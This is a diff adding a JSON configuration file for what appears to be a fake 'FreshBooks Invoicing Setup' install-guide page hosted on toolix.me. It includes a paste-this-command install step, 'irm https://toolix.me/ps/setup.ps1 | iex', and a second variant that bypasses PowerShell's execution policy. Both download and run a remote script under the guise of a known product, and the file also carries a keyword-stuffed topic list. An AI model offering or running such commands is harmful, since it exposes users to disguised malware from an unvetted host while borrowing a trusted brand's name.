@@ -1,0 +1,27 @@
+{
+  "repo": "FreshBooks-Invoicing-Setup",
+  "product": "FreshBooks Invoicing Setup",
+  "product_title": "FreshBooks Invoicing",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-freshbooks-invoicing",
+    "freshbooks-invoicing-app",
+    "terminal-client",
+    "database-tools",
+    "developer-tools",
+    "coding-workflow",
+    "freshbooks-invoicing-windows-tool",
+    "freshbooks-invoicing-modeling-tool",
+    "freshbooks-invoicing",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
